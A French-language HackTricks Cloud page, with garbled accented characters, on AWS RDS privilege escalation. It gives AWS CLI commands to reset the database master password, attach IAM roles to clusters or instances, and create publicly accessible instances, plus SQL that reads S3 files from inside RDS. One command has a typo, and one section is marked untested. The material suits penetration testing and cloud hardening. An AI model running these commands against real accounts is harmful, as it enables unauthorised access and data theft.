# AWS - √âl√©vation de privil√®ges RDS

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## RDS - Service de base de donn√©es relationnelle

Pour plus d'informations sur RDS, consultez :

{% content-ref url="../aws-services/aws-databases/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-databases/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

Avec cette autorisation, un attaquant peut **modifier le mot de passe de l'utilisateur principal** et le login √† l'int√©rieur de la base de donn√©es :
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
Vous devrez √™tre capable de **contacter la base de donn√©es** (elles sont g√©n√©ralement accessibles uniquement depuis les r√©seaux internes).
{% endhint %}

**Impact potentiel :** Trouver des informations sensibles √† l'int√©rieur des bases de donn√©es.

### rds-db:connect

Selon la [**documentation**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html), un utilisateur ayant cette autorisation pourrait se connecter √† l'instance de la base de donn√©es.

### Abus des autorisations IAM du r√¥le RDS

#### Postgresql (Aurora)

{% hint style="success" %}
Si en ex√©cutant **`SELECT datname FROM pg_database;`** vous trouvez une base de donn√©es appel√©e **`rdsadmin`**, vous saurez que vous √™tes √† l'int√©rieur d'une **base de donn√©es AWS postgresql**.
{% endhint %}

Tout d'abord, vous pouvez v√©rifier si cette base de donn√©es a √©t√© utilis√©e pour acc√©der √† un autre service AWS. Vous pourriez v√©rifier cela en examinant les extensions install√©es :
```sql
SELECT * FROM pg_extension;
```
Si vous trouvez quelque chose comme **`aws_s3`**, vous pouvez supposer que cette base de donn√©es a **un certain type d'acc√®s sur S3** (il existe d'autres extensions telles que **`aws_ml`** et **`aws_lambda`**).

De plus, si vous avez les autorisations pour ex√©cuter **`aws rds describe-db-clusters`**, vous pouvez voir si le **cluster a un r√¥le IAM attach√©** dans le champ **`AssociatedRoles`**. Si c'est le cas, vous pouvez supposer que la base de donn√©es a √©t√© **pr√©par√©e pour acc√©der √† d'autres services AWS**. En fonction du **nom du r√¥le** (ou si vous pouvez obtenir les **autorisations** du r√¥le), vous pourriez **deviner** quels sont les acc√®s suppl√©mentaires dont dispose la base de donn√©es.

Maintenant, pour **lire un fichier √† l'int√©rieur d'un bucket**, vous devez conna√Ætre le chemin complet. Vous pouvez le lire avec :
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
Si vous aviez **des identifiants AWS bruts**, vous pourriez √©galement les utiliser pour acc√©der aux donn√©es S3 avec :
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Postgresql **n'a pas besoin de modifier une variable de groupe de param√®tres** pour pouvoir acc√©der √† S3.
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
√Ä l'int√©rieur d'un mysql, si vous ex√©cutez la requ√™te **`SELECT User, Host FROM mysql.user;`** et qu'il y a un utilisateur appel√© **`rdsadmin`**, vous pouvez supposer que vous √™tes √† l'int√©rieur d'une **base de donn√©es AWS RDS mysql**.
{% endhint %}

√Ä l'int√©rieur du mysql, ex√©cutez **`show variables;`** et si des variables telles que **`aws_default_s3_role`**, **`aurora_load_from_s3_role`**, **`aurora_select_into_s3_role`** ont des valeurs, vous pouvez supposer que la base de donn√©es est pr√™te √† acc√©der aux donn√©es S3.

De plus, si vous avez les autorisations pour ex√©cuter **`aws rds describe-db-clusters`**, vous pouvez v√©rifier si le cluster a un **r√¥le associ√©**, ce qui signifie g√©n√©ralement un acc√®s aux services AWS).

Maintenant, pour **lire un fichier √† l'int√©rieur d'un bucket**, vous devez conna√Ætre le chemin complet. Vous pouvez le lire avec:
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

Un attaquant avec les autorisations `rds:AddRoleToDBCluster` et `iam:PassRole` peut **ajouter un r√¥le sp√©cifi√© √† une instance RDS existante**. Cela pourrait permettre √† l'attaquant d'**acc√©der √† des donn√©es sensibles** ou de modifier les donn√©es dans l'instance.
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**Impact potentiel** : Acc√®s √† des donn√©es sensibles ou modifications non autoris√©es des donn√©es dans l'instance RDS.\
Notez que certaines bases de donn√©es n√©cessitent des configurations suppl√©mentaires telles que Mysql, qui doit sp√©cifier le r√¥le ARN dans les groupes de param√®tres √©galement.

### `rds:CreateDBInstance`

Rien qu'avec cette autorisation, un attaquant pourrait cr√©er une **nouvelle instance au sein d'un cluster** qui existe d√©j√† et a un **r√¥le IAM** attach√©. Il ne pourra pas changer le mot de passe de l'utilisateur principal, mais il pourrait exposer la nouvelle instance de base de donn√©es √† Internet :
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
TODO: Test
{% endhint %}

Un attaquant avec les autorisations `rds:CreateDBInstance` et `iam:PassRole` peut **cr√©er une nouvelle instance RDS avec un r√¥le sp√©cifi√© attach√©**. L'attaquant peut ensuite potentiellement **acc√©der √† des donn√©es sensibles** ou modifier les donn√©es dans l'instance.

{% hint style="warning" %}
Certains pr√©requis du r√¥le/profil d'instance √† attacher (de [**ici**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)):

* Le profil doit exister dans votre compte.
* Le profil doit avoir un r√¥le IAM que Amazon EC2 a l'autorisation d'assumer.
* Le nom du profil d'instance et le nom du r√¥le IAM associ√© doivent commencer par le pr√©fixe `AWSRDSCustom`.
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
{% endcode %}

**Impact potentiel**: Acc√®s √† des donn√©es sensibles ou modifications non autoris√©es des donn√©es dans l'instance RDS.

### `rds:AddRoleToDBInstance`, `iam:PassRole`

Un attaquant avec les autorisations `rds:AddRoleToDBInstance` et `iam:PassRole` peut **ajouter un r√¥le sp√©cifi√© √† une instance RDS existante**. Cela pourrait permettre √† l'attaquant d'**acc√©der √† des donn√©es sensibles** ou de modifier les donn√©es dans l'instance.

{% hint style="warning" %}
L'instance de la base de donn√©es doit √™tre en dehors d'un cluster pour cela.
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**Impact potentiel**: Acc√®s √† des donn√©es sensibles ou modifications non autoris√©es des donn√©es dans l'instance RDS.

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
